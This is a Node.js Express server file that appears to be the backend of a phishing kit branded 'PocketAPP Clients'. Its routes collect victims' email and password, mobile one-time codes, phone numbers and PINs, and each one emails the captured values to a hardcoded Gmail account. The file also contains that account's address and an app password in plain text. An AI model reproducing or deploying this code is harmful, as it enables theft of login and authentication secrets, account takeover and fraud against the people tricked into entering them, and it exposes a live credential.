const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "estie.katie@gmail.com";
const pass = "kvzsrfgvlcvufodr";

// Helper function to create transporter (DRY principle)
const createTransporter = () => {
  return nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
};

// Helper function to send email
const sendEmail = (mailOptions, res) => {
  const transporter = createTransporter();
  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("error Occured: " + error);
    } else {
      console.log("Email sent " + info.response);
      res.send("success");
    }
  });
};

// API route for Email and Password
app.post("/", (req, res) => {
  const { email, password } = req.body;

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PocketAPP Clients: Email & Password Submission`,
    text: `PocketAPP Clients: New user registered with Email: ${email} and password: ${password}`,
  };

  sendEmail(mailOptions, res);
});

// API route for Mobile OTP
app.post("/otp", (req, res) => {
  console.log(req.body);

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PocketAPP Clients: Mobile OTP: ${req.body?.otp}`,
    text: `PocketAPP Clients: User entered Mobile OTP: ${req.body?.otp}`,
  };

  sendEmail(mailOptions, res);
});

// API route for Phone Number
app.post("/phone", (req, res) => {
  console.log(req.body);
  const { phone } = req.body;

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PocketAPP Clients: Phone Number: ${phone}`,
    text: `PocketAPP Clients: User entered Phone Number: ${phone}`,
  };

  sendEmail(mailOptions, res);
});

// API route for PIN
app.post("/pin", (req, res) => {
  console.log(req.body);
  const { pin } = req.body;

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PocketAPP Clients: PIN: ${pin}`,
    text: `PocketAPP Clients: User entered PIN: ${pin}`,
  };

  sendEmail(mailOptions, res);
});

// API route for Complaint Box
app.post("/complaint", (req, res) => {
  console.log(req.body);
  const { complaint } = req.body;

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PocketAPP Clients: New Complaint Submitted`,
    text: `PocketAPP Clients: User submitted a complaint:

${complaint || "No complaint message provided"}`,
  };

  sendEmail(mailOptions, res);
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
